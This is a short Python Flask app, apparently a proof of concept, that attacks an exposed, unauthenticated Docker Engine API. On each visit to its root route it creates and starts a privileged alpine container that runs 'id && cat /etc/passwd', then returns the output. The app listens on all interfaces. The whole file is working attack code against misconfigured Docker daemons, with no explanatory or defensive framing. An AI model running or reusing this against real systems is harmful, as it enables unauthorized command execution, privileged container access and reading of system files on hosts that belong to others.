import os
import requests
from flask import Flask, jsonify

app = Flask(__name__)
DOCKER_HOST = os.getenv('DOCKER_HOST', 'http://docker:2375')

@app.route('/')
def index():
    payload = {
        "Image": "alpine",
        "Cmd": ["sh", "-c", "id && cat /etc/passwd"],
        "HostConfig": {"Privileged": True}
    }
    try:
        r = requests.post(f"{DOCKER_HOST}/containers/create", json=payload)
        r.raise_for_status()
        container_id = r.json().get('Id')
        start_resp = requests.post(f"{DOCKER_HOST}/containers/{container_id}/start")
        start_resp.raise_for_status()
        logs = requests.get(f"{DOCKER_HOST}/containers/{container_id}/logs?stdout=1&stderr=1")
        return jsonify({"status": "container started", "logs": logs.text})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8090)
